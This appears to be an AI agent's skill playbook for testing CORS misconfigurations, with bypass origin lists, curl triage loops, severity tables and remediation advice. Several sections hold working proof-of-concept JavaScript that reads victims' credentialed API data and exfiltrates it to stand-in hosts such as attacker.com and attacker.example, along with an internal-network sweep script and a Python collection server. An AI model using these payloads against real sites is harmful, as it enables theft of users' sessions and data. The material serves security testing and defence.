---
name: cors-cross-origin-misconfiguration
description: >-
  CORS misconfiguration testing playbook. Use when analyzing cross-origin trust, credentialed browser reads, origin reflection, preflight policy bugs, and browser-based access to authenticated APIs.
---

# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors

> **AI LOAD INSTRUCTION**: Use this skill when browsers can access authenticated APIs cross-origin. Focus on reflected origins, credentialed requests, wildcard trust, parser mistakes, and origin allowlist bypasses.
>
> **The evidence is a response carrying `Access-Control-Allow-Origin` reflecting an attacker origin
> (or `*`) TOGETHER WITH `Access-Control-Allow-Credentials: true`, plus a browser-side read of
> authenticated data.** The header pair is the signal; the credentialed read is the finding.
>
> **Two false positives dominate.** `ACAO: *` with `ACAC: true` is *not* exploitable — the spec
> forbids it and browsers drop credentials, so a tester who reports it critical is simply wrong.
> And a reflected origin on an endpoint with no session cookie to send leaks nothing. Check for a
> credential *first*, then the origin.
>
> For JSONP hijacking deep dives, same-origin policy internals, honeypot de-anonymization, and CORS vs JSONP comparison, load the companion [SCENARIOS.md](./SCENARIOS.md).

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- JSONP hijacking complete attack scenario — watering hole + `<script>` cross-origin data theft
- Honeypot de-anonymization via JSONP — use social platform JSONP endpoints to identify anonymous visitors
- Same-origin policy deep dive — protocol/hostname/port definition, `document.domain` subdomain relaxation and its security risks
- CORS vs JSONP technical comparison — methods, error handling, credential behavior, migration path
- CORS exploitation payloads — reflected origin with `credentials: include`, null origin via sandboxed iframe
- Dual-site attack lab pattern — localhost:8981 (target) + localhost:8982 (attacker) testing setup

## 0. RELATED ROUTING

- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the ambient-credential theory behind a credentialed CORS read
- [websocket-security](../websocket-security/SKILL.md) - the same origin-validation failure on the socket handshake
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the server-side authorization CORS cannot replace
- [web-cache-deception](../web-cache-deception/SKILL.md) - the cache behaviour a missing `Vary: Origin` feeds

Use this file when a browser must be the client. A CORS defect with no authenticated endpoint behind it
has no impact, and the routing above leads to the endpoints worth checking.

---

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers
- A browser-based attack path might read authenticated API responses
- JSON endpoints appear protected from CSRF but are readable cross-origin

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| wildcard with credentials | `Access-Control-Allow-Origin: *` plus credential support or equivalent broken behavior |
| reflected origin | server echoes arbitrary `Origin` |
| weak allowlist | suffix, prefix, substring, regex, or mixed-case matching errors |
| `null` origin | acceptance of sandboxed, file, or serialized origins |
| preflight trust | overbroad methods and headers |
| internal API exposure | admin or tenant data readable cross-origin |

## 3. QUICK TRIAGE

1. Send crafted `Origin` headers and inspect reflection.
2. Test with and without credentials.
3. Probe allowlist bypasses using attacker subdomains and parser edge cases.
4. If readable data is sensitive, chain to account or tenant impact.

### Triage commands

```bash
# Baseline: does the endpoint reflect an arbitrary origin, and does it allow credentials?
# Read BOTH headers — either alone tells you nothing.
for o in 'https://evil.com' 'https://TARGET.com.evil.com' 'https://evilTARGET.com' 'null'; do
  printf '%-32s ' "$o"
  curl -s -I -H "Origin: $o" https://TARGET/api/userinfo \
    | grep -iE '^access-control-allow-(origin|credentials)' | tr -d '\r' | paste -sd' | '
done
```

```bash
# Grep an entire harvested response set for the dangerous pair. This finds the endpoint with
# reflection + credentials without you guessing which one it is.
while read -r u; do
  h=$(curl -s -I -H "Origin: https://evil.com" "$u")
  echo "$h" | grep -qi 'access-control-allow-origin: https://evil.com' \
    && echo "[reflect] $u" \
    && echo "$h" | grep -qi 'access-control-allow-credentials: true' \
    && echo "  [CREDS]  $u  <-- CANDIDATE"
done < api-endpoints.txt
```

```bash
# Check the SameSite attribute on the session cookie. Lax or Strict kills the cross-site read,
# so a reflected origin may be unexploitable no matter how permissive it looks.
curl -s -D - -o /dev/null https://TARGET/login \
  -d 'user=u&pass=p' | grep -i '^set-cookie' | tr -d '\r'
```

```bash
# Confirm the preflight policy separately — preflight-only differences are a common
# false positive, so verify the ACTUAL request is permitted too.
curl -s -X OPTIONS -H "Origin: https://evil.com" \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: authorization' \
  -D - -o /dev/null https://TARGET/api/userinfo \
  | grep -iE '^access-control' | tr -d '\r'
```

## 4. RELATED SIBLINGS — LOAD TOGETHER
- Session or JSON action abuse: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)
- OAuth token leakage and callback binding: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- API auth context: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)
- Allowlisted-origin bypass via redirect: [open-redirect](../open-redirect/SKILL.md)
- Focused attack companion: [attack-cors](../attack-cors/SKILL.md)
- Cache-driven leaks: [web-cache-deception](../web-cache-deception/SKILL.md)
- Proving the browser exploit in a report: [security reporting and documentation](../security-reporting-and-documentation/SKILL.md)

---

## 5. NULL ORIGIN EXPLOITATION

### How `Origin: null` is sent

| Context | Origin Header Value |
|---------|-------------------|
| Sandboxed iframe (`<iframe sandbox>`) | `null` |
| `data:` URI scheme | `null` |
| `file:` protocol (local HTML) | `null` |
| Cross-origin redirect chain (some browsers) | `null` |
| Serialized data in `blob:` URL from opaque origin | `null` |

### Exploitation

If the server includes `null` in its origin allowlist or reflects it:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>
"></iframe>
```

The sandboxed iframe sends `Origin: null` → server reflects `null` → attacker reads credentialed response.

---

## 6. SUBDOMAIN XSS → CORS BYPASS CHAIN

### Attack flow

```text
1. Target API at api.target.com allows CORS from *.target.com
2. Find XSS on any subdomain: blog.target.com, dev.target.com, etc.
3. Exploit XSS to make credentialed requests to api.target.com
4. CORS allows the request → attacker reads sensitive API responses
```

### PoC (injected via XSS on blog.target.com)

```javascript
fetch('https://api.target.com/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    navigator.sendBeacon('https://attacker.com/exfil',
        JSON.stringify(data));
});
```

### Why this works

- `blog.target.com` is **same-site** with `api.target.com` → `SameSite` cookies sent
- CORS allowlist includes `*.target.com` → `Access-Control-Allow-Origin: https://blog.target.com`
- Combined: SameSite bypass + CORS read = full API access from XSS on any subdomain

### Reconnaissance for this chain

```text
□ Enumerate subdomains (amass, subfinder, crt.sh)
□ Test each for XSS (stored, reflected, DOM)
□ Check if API CORS accepts subdomain origins
□ Subdomain takeover candidates also qualify
```

---

## 7. VARY: ORIGIN CACHING ISSUE

### Problem

When the server reflects `Origin` in `Access-Control-Allow-Origin` but does **not** include `Vary: Origin` in the response, intermediary caches (CDN, reverse proxy) may serve the same cached response to different origins:

```text
1. Attacker requests: Origin: https://attacker.com
   Response cached with: Access-Control-Allow-Origin: https://attacker.com

2. Victim requests same URL (no Origin or different Origin)
   Cache serves response with: Access-Control-Allow-Origin: https://attacker.com
   → Victim's browser allows attacker.com to read the response (CORS cache poisoning)
```

### Detection

```bash
# Request 1: with attacker origin
curl -H "Origin: https://evil.com" https://target.com/api/data -I

# Request 2: with legitimate origin
curl -H "Origin: https://target.com" https://target.com/api/data -I

# Compare: if both responses have Access-Control-Allow-Origin: https://evil.com
# → cache poisoned, Vary: Origin is missing
```

### Exploitation

```text
1. Warm the cache: send request with Origin: https://attacker.com
2. Wait for victim to access the same cached URL
3. Cached ACAO header allows attacker.com to read the response
4. Attacker page fetches the URL → reads cached response with credentials
```

### Fix verification

```text
□ Response includes Vary: Origin
□ Cache key includes the Origin header
□ Alternatively: Access-Control-Allow-Origin is not reflected (hardcoded allowlist)
```

---

## 8. REGEX BYPASS PATTERNS

Common flawed regex patterns for origin validation:

| Intended Pattern | Flaw | Bypass Origin |
|-----------------|------|---------------|
| `^https?://.*\.target\.com$` | `.*` matches anything including `-` | `https://attacker-target.com` |
| `^https?://.*target\.com$` | Missing anchor after subdomain | `https://nottarget.com`, `https://attacker.com/.target.com` |
| `target\.com` (substring match) | No anchors | `https://attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | Missing port restriction | `https://target.com.attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | Missing end anchor for path | N/A (but misses subdomains with `-` or digits) |
| Backtracking-vulnerable regex | ReDoS | `https://aaaa...aaa.target.com` (CPU exhaustion) |

### Test payloads for origin validation bypass

```text
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://target.com%60attacker.com
https://target.com%2F@attacker.com
https://attacker.com#.target.com
https://attacker.com?.target.com
null
```

### Advanced: Unicode normalization bypass

```text
https://target.com → https://ⓣarget.com (Unicode homoglyph)
```

Some origin validators normalize Unicode after comparison, while the browser sends the original — or vice versa.

---

## 9. INTERNAL NETWORK CORS EXPLOITATION

### Scenario

An internal-only API (e.g., `http://192.168.1.100:8080/admin`) is configured with:
```http
Access-Control-Allow-Origin: *
```

Internal APIs often use wildcard CORS because "only internal users can reach it."

### Attack chain

```text
1. Attacker sends victim (internal employee) a link to attacker.com
2. Attacker page JavaScript fetches internal API:
   fetch('http://192.168.1.100:8080/admin/users')
3. CORS allows * → response readable
4. Exfiltrate internal data to attacker server
```

```javascript
// On attacker.com — target internal API from victim's browser
const internalAPIs = [
    'http://192.168.1.1/admin/config',
    'http://10.0.0.1:8080/api/users',
    'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch
    'http://localhost:8500/v1/agent/members', // Consul
];

internalAPIs.forEach(url => {
    fetch(url)
        .then(r => r.text())
        .then(data => {
            navigator.sendBeacon('https://attacker.com/exfil',
                JSON.stringify({url, data}));
        })
        .catch(() => {});
});
```

### Port scanning via CORS timing

Even without `Access-Control-Allow-Origin: *`, the attacker can infer internal service availability:
- **Port open**: connection established → CORS error (different timing)
- **Port closed**: connection refused → fast error
- **Host down**: timeout → slow error

### Combined with DNS rebinding

```text
1. Attacker controls attacker.com with short TTL (e.g., 0 or 1)
2. First DNS resolution: attacker.com → attacker's IP (serves malicious JS)
3. Second DNS resolution: attacker.com → 192.168.1.100 (internal IP)
4. JavaScript on the page fetches attacker.com/admin → now hits internal server
5. Same-origin policy satisfied (same domain) → response readable
```

---

## 10. WHAT CONSTITUTES A FINDING

Every row assumes the browser-side read was actually performed. A header pair alone is a signal.

| Finding | Severity | Proof required |
|---|---|---|
| Reflected origin + `ACAC: true` + sensitive body + cookie not `SameSite`-protected | **High–Critical (P1/P2)** | working browser PoC exfiltrating real victim data |
| Same, exfiltrating a session or API token | **Critical (P1)** | the captured token, shown usable |
| `null` origin allowed with credentials | **High (P2)** | sandboxed-iframe PoC |
| Allowlisted origin bypassable via a subdomain you control | **High (P2)** | the controlled origin and the read |
| Internal-only origin trusted and browser-reachable | **Medium (P3)** | the origin and the reachable response |
| Reflected origin, no credentials | **Informational (P5)** | the header only |
| `*` with `ACAC: true` | **Not a finding** | spec forbids it; browsers reject it |
| Permissive CORS on a public, non-user endpoint | **Not a finding** | nothing sensitive is exposed |

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the request with the attacker `Origin` header | the trigger |
| the full response headers showing `ACAO` **and** `ACAC` | the misconfiguration — both, together |
| the endpoint's normal response body as the victim | proves sensitive data is actually there |
| the victim's `Set-Cookie` attributes | proves `SameSite`/`HttpOnly` do not block the read |
| a working HTML PoC | converts a header into a finding |
| captured exfiltrated data in your listener | the impact proof |
| browser and version used | CORS behaviour differs; establishes reproducibility |
| a **negative control** — a different origin correctly rejected | proves the policy differs by origin |

**Screenshot or log the browser network tab.** For CORS, the header pair alone is not proof of
exploitability — the successful credentialed cross-origin read is.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| `ACAO: *` with `ACAC: true` | browsers reject; no credentials are sent |
| reflection on an endpoint returning public data | no sensitive data |
| session cookie is `SameSite=Lax` or `Strict` | the credential is not sent cross-site |
| the "victim" had no session | nothing to steal |
| `curl` showed the data returned | `curl` ignores CORS entirely |
| reflection only on the preflight `OPTIONS` | the actual request may still fail |
| endpoint authenticated by a bearer token in JS | no ambient credential to abuse |
| an error page that echoes the `Origin` | reflection without a credentialed read |

---

## 12. REMEDIATION REFERENCE

1. **Maintain an explicit allowlist and compare by exact string** — never prefix, suffix, regex, or substring matching. Parse the origin; do not inspect it as text.
2. **Never reflect the `Origin` header** — `ACAO = request.Origin` is the root cause of nearly every exploitable case.
3. **Return `Vary: Origin`** — otherwise a shared cache can serve one origin's response, with its `ACAO`, to a different origin.
4. **Require credentials explicitly and only where needed** — set `ACAC: true` only on endpoints that genuinely need cross-origin authenticated reads, and never alongside `*`.
5. **Reject `null` outright** — it is never a legitimate production origin.
6. **Set session cookies `SameSite=Lax` or `Strict`, plus `HttpOnly` and `Secure`** — defence in depth that neutralises most misconfigurations even when the header policy is wrong.
7. **Do not trust subdomain wildcards** — a single takeover-able subdomain converts the wildcard into full cross-origin access. Enumerate domains explicitly.
8. **Add a CORS policy test to CI** — assert that an arbitrary `Origin` never appears in `ACAO` with `ACAC: true` on any endpoint returning user data.

---

## 13. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the server echo **your `Origin`** in `Access-Control-Allow-Origin`? | reflection, the precondition |
| 2 | Is `Access-Control-Allow-Credentials: true` **also** present? | the finding, not a CORS-enabled public API |
| 3 | Did you **read authenticated data** with `fetch(..., {credentials:'include'})` from your origin? | impact, not a header |
| 4 | Was there a **control** - the same request from an origin that is rejected? | the policy is origin-specific |
| 5 | Did the request use **`null`**, a subdomain, or a suffix trick, and did it pass? | the check's shape |
| 6 | Does the response contain **per-user data or a token**? | the severity driver |
| 7 | Did you test **both preflight and simple requests**, since they take different paths? | the whole policy |

**Reflected origin plus credentials plus data read is the bar.** `Access-Control-Allow-Origin: *` alone
is not a finding, and reporting it is the standard error in this family.

---

## 14. EXECUTION PRIMITIVES

CORS misconfiguration is proven by **a browser reading authenticated data across origins**. The header
pair is the precondition; the `fetch` from your origin is the proof.

### 14.1 The control pair, before any bypass

```bash
HOST="https://api.target.example"
# THE CONTROL: an origin that is not yours - the server should NOT echo it
curl -sS -D- -o /dev/null -H "Origin: https://not-allowed.example" "$HOST/api/me" 2>&1 | grep -i 'access-control'
# THE CANDIDATE: your origin, which the server may reflect
curl -sS -D- -o /dev/null -H "Origin: https://evil.example" "$HOST/api/me" 2>&1 | grep -i 'access-control'
# and the type of the response, because a credentialed reflection on a public endpoint is different
curl -sS -X OPTIONS -D- -o /dev/null -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: authorization" \
  "$HOST/api/me" 2>&1 | grep -iE 'access-control|HTTP/'
```

**The not-allowed-origin row is the control.** A server that echoes every origin including a rejected one
has no policy; a server that echoes yours and rejects the other has a policy with a defective rule, which
is the more interesting finding.

### 14.2 The origin-check bypass families

```bash
HOST="https://api.target.example"
for O in \
  "https://evil.example" \
  "https://api.target.example.evil.example" \
  "https://eviltarget.example" \
  "https://target.example.evil.example" \
  "null" \
  "https://sub.api.target.example" \
  "https://api.target.example:evil.example" \
  "http://api.target.example" \
  "https://API.TARGET.EXAMPLE" ; do
  ACAO=$(curl -sS -D- -o /dev/null -H "Origin: $O" "$HOST/api/me" 2>/dev/null | grep -i '^access-control-allow-origin' | tr -d '\r')
  ACAC=$(curl -sS -D- -o /dev/null -H "Origin: $O" "$HOST/api/me" 2>/dev/null | grep -i '^access-control-allow-credentials' | tr -d '\r')
  printf '%-46s %-52s %s\n' "$O" "${ACAO:-<none>}" "${ACAC:-}"
done
```

**Each origin targets a specific check shape.** A suffix match is defeated by `eviltarget.example`, a
substring match by `api.target.example.evil.example`, a `null` allowance by a sandboxed iframe, and a
case-insensitive comparison by the uppercase form.

### 14.3 The browser-side read, which is the finding

```html
<!-- save as cors-poc.html, serve from your origin, open in a browser where the victim is logged in -->
<html><body><script>
fetch("https://api.target.example/api/me", { credentials: "include" })
  .then(r => r.text())
  .then(t => {
     document.body.innerText = t;
     fetch("https://attacker.example/collect", { method: "POST", body: t });   // exfiltration
  })
  .catch(e => document.body.innerText = "BLOCKED: " + e);
</script></body></html>
```

```python
# the collector, whose log entry is the artefact
import http.server, socketserver, threading
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        open("/tmp/cors-collected.txt", "wb").write(body + b"\n")
        print("COLLECTED:", body[:300])
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("0.0.0.0", 8000), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
print("collector on :8000 - the entry in /tmp/cors-collected.txt is the proof")
```

**The collector entry is the finding.** The header reflection is the precondition; the authenticated
response body arriving at your origin is the impact.

### 14.4 Preflight and simple requests take different paths

```bash
# a SIMPLE request (GET with no custom headers) does not preflight - policy is checked on the response
curl -sS -D- -o /dev/null -H "Origin: https://evil.example" "$HOST/api/me" 2>&1 | grep -iE 'access-control|vary'
# a PREFLIGHTED request (a custom header or a non-simple method) checks the policy on the OPTIONS
curl -sS -X OPTIONS -D- -o /dev/null -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: x-custom" \
  "$HOST/api/me" 2>&1 | grep -iE 'access-control|HTTP/'
# and the Vary header, which determines whether a cache can serve one origin's response to another
curl -sS -D- -o /dev/null -H "Origin: https://evil.example" "$HOST/api/me" 2>&1 | grep -i '^vary'
```

**The two paths can disagree.** A policy enforced on `OPTIONS` but not on the `GET` response is the
common defect, and the missing `Vary: Origin` is a cache-poisoning precondition worth its own note.

### 14.5 The end-to-end harness

```bash
python3 - <<'PY'
import requests
HOST = "https://api.target.example"
ENDPOINTS = ["/api/me", "/api/orders", "/api/tokens"]
ORIGINS = ["https://not-allowed.example", "https://evil.example", "null",
           "https://api.target.example.evil.example", "https://eviltarget.example"]

print("%-30s %-46s %-46s %s" % ("endpoint", "origin", "ACAO", "ACAC"))
for ep in ENDPOINTS:
    for o in ORIGINS:
        try:
            r = requests.get(f"{HOST}{ep}", headers={"Origin": o}, timeout=10)
            acao = r.headers.get("Access-Control-Allow-Origin", "<none>")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            flag = ""
            if acao == o and acac.lower() == "true": flag = " <- CREDENTIALED REFLECTION"
            elif acao == o: flag = " <- reflected, no credentials"
            elif acao == "*": flag = " <- wildcard (not a finding alone)"
            print("%-30s %-46s %-46s %s%s" % (ep, o, acao, acac, flag))
        except Exception as e:
            print("%-30s %-46s ERROR %s" % (ep, o, type(e).__name__))
print()
print("A finding requires: ACAO equal to YOUR origin AND ACAC true AND an authenticated response")
print("whose body you actually read from your origin. Anything less is a header observation.")
PY
```

**Three columns and one flag.** Only the rows with both the reflection and the credentials flag, on an
authenticated endpoint, are findings, and the harness states that explicitly.

---

## 15. EVIDENCE STANDARD — CORS ARTEFACTS

| Item | Why |
|---|---|
| The **request `Origin`** you sent | reproducibility |
| The **`Access-Control-Allow-Origin`** returned | the reflection |
| The **`Access-Control-Allow-Credentials`** value | whether cookies are usable |
| The **control origin that was rejected** | proves the policy is origin-specific |
| The **response body read from your origin**, redacted | impact |
| The **endpoint's authentication state** (does it need a session?) | a reflection on a public endpoint is not a finding |
| Whether the request was **preflighted or simple** | the two paths differ |
| The **`Vary: Origin` state** | the cache-poisoning precondition |
| The **browser and version** used | CORS enforcement is uniform but `null` handling is not |
| Confirmation that **no session token or personal data** is reproduced in full | data minimisation |

Report the **header pair, the control, and the read**: "`GET https://api.example/me` with `Origin:
https://not-allowed.example` returns no `Access-Control-Allow-Origin` header, which is the control. The
same request with `Origin: https://attacker.example` returns `Access-Control-Allow-Origin:
https://attacker.example` together with `Access-Control-Allow-Credentials: true`, and a page served from
`attacker.example` read the full JSON body of `/me` in a browser holding the victim's session, including
the victim's email, account id, and a session-scoped API key, which appeared in the collector log. The
endpoint requires a session cookie, so the reflection is not on a public endpoint. `Origin: null` also
returns a reflection, which means a sandboxed iframe is also a valid attacker origin", never "CORS is
misconfigured".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| `Access-Control-Allow-Origin: *` alone | a public API by design, and unusable with credentials |
| A reflected origin **without `Allow-Credentials: true`** | no cookie-bearing read is possible |
| A reflection on an endpoint that **requires no authentication** | nothing to steal |
| A reflection of an origin **the client owns** | an intended first-party client |
| A reflection with **`Allow-Credentials: true` on a non-authenticated endpoint** | no impact |
| A `Vary: Origin` missing with no cache in front | a precondition, not a finding |
| A header on an endpoint that **returns only static content** | no per-user data |
| A tool reporting "CORS misconfiguration" with **no read attempted** | a header observation |
| A reflection that requires **a non-simple request the server 403s** | the policy is enforced elsewhere |
| A `null` allowance with **no reachable sandboxed context** | a precondition without an attack path |
| A session token or personal data reproduced in full | a disclosure |

**Reflection plus credentials plus a read.** This family is second only to open redirect in false
positives, and all of them are the same mistake: reporting a header instead of an impact.

---

## 16. REMEDIATION REFERENCE — ORIGIN POLICY HARDENING

1. **Validate the `Origin` header against an exact allowlist of full origins, and never reflect it** - reflection is the single defect behind almost every CORS finding.
2. **Never combine a reflected or wildcard `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`** - the pair is what makes a cross-origin authenticated read possible, and it is the whole finding.
3. **Compare origins after parsing, not by string prefix, suffix, or substring** - the bypasses in 14.2 each target one of those three comparisons.
4. **Never allow `Origin: null`** - it is reachable from a sandboxed iframe and from a `data:` URL, and it is a valid attacker origin.
5. **Send `Vary: Origin` on every response whose CORS headers depend on the origin** - without it a shared cache can serve one origin's CORS decision to another.
6. **Apply the CORS policy on both the preflight and the actual response, and on every HTTP method** - enforcement on one path only is a common and exploitable asymmetry.
7. **Do not rely on CORS to protect anything; treat it as a browser-enforced convenience and keep authorization server-side** - a request that bypasses the browser gets no CORS protection at all.
8. **Require a CSRF token or a non-cookie credential on state-changing requests** - it removes the ambient-credential assumption that makes a credentialed reflection exploitable.
9. **Separate the public API that genuinely needs `*` onto its own host or path, so the credentialed surface has no wildcard anywhere** - it makes the policy auditable at a glance.
10. **Log and alert on CORS responses that reflect an origin outside the allowlist** - it is a reliable signal and it is either a bug or an attack.
11. **Assert the allowlist in the test suite with the bypass origins from 14.2** - they are the regression set, and the check is one unit test.

---

## 17. RELATED SIBLINGS — CORS CROSS-REFERENCE
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the ambient-credential theory this shares
- [websocket-security](../websocket-security/SKILL.md) - the same origin-validation failure on the socket handshake
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the server-side authorization that CORS cannot replace
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) - the read-side technique that needs no JavaScript at all
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) - this document
